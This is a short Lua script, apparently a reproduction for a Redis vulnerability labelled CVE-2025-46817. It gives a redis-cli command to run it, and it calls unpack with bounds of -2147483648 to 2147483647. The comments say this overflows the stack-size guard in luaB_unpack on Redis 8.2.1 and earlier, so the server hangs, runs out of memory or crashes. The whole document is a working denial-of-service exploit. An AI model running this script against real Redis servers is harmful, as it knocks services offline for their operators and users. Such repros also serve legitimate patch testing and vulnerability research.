-- CVE-2025-46817 repro: trigger integer overflow in Lua's unpack helper.
-- Usage: redis-cli -h localhost -p 6379 --eval CVE-2025-46817.lua

local data = {1, 2, 3}

-- These bounds intentionally overflow the signed arithmetic inside luaB_unpack
-- on vulnerable Redis builds (<= 8.2.1). The stack size calc wraps, the guard
-- passes, and Redis attempts to materialize billions of return values.
-- Expect the server to hang, exhaust memory, or crash.
return {unpack(data, -2147483648, 2147483647)}
